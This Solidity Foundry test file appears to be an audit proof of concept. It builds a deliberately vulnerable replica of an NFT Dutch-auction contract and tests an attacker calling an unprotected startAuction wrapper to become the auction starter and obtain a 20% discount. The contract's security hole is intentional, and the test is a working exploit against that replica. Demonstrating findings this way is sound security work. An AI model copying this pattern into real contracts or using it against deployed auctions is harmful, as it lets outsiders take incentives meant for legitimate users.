pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract NFTEDAStarterIncentive {
    uint256 internal constant WAD = 1e18;
    address public owner;
    uint256 public auctionCreatorDiscountPercentWad;
    uint256 internal _pricePercentAfterDiscount;

    struct AuctionState { uint96 startTime; address starter; }
    mapping(uint256 => AuctionState) public auctionState;

    constructor(uint256 _auctionCreatorDiscountPercentWad) {
        owner = msg.sender;
        auctionCreatorDiscountPercentWad = _auctionCreatorDiscountPercentWad;
        _pricePercentAfterDiscount = WAD - _auctionCreatorDiscountPercentWad;
    }

    modifier onlyOwner() { require(msg.sender == owner); _; }

    // Exposed wrapper so an attacker can trigger the internal start path
    function startAuction(uint256 id) external {
        _setAuctionStartTime(id);
    }

    // vulnerable internal: assigns starter = msg.sender
    function _setAuctionStartTime(uint256 id) internal virtual {
        auctionState[id] = AuctionState({startTime: uint96(block.timestamp), starter: msg.sender});
    }

    // simplified pricing logic: base price is 1000 units
    function _auctionCurrentPrice(uint256 id) internal view returns (uint256) {
        uint256 price = 1000;
        if (msg.sender == auctionState[id].starter) {
            price = mulWadUp(price, _pricePercentAfterDiscount);
        }
        return price;
    }

    // public getter used by tests
    function currentPrice(uint256 id) external view returns (uint256) {
        return _auctionCurrentPrice(id);
    }

    function starterOf(uint256 id) external view returns (address) {
        return auctionState[id].starter;
    }

    // minimal FixedPointMathLib.mulWadUp
    function mulWadUp(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y + WAD - 1) / WAD;
    }
}

contract NFTEDAStarterIncentiveTest is Test {
    NFTEDAStarterIncentive target;
    address attacker;
    address buyer;

    function setUp() public {
        // 20% discount = 0.2 * 1e18
        target = new NFTEDAStarterIncentive(200000000000000000);
        attacker = makeAddr("attacker");
        buyer = makeAddr("buyer");
    }

    function test_attacker_exploits__setAuctionStartTime() public {
        // Attacker calls the exposed wrapper which uses msg.sender as the starter
        vm.prank(attacker);
        target.startAuction(1);

        // Confirm the starter was set to the attacker
        assertEq(target.starterOf(1), attacker);

        // Attacker observes discounted price
        vm.prank(attacker);
        uint256 discounted = target.currentPrice(1);

        // A different caller (buyer) observes the full price
        vm.prank(buyer);
        uint256 full = target.currentPrice(1);

        assertTrue(discounted < full);
    }
}

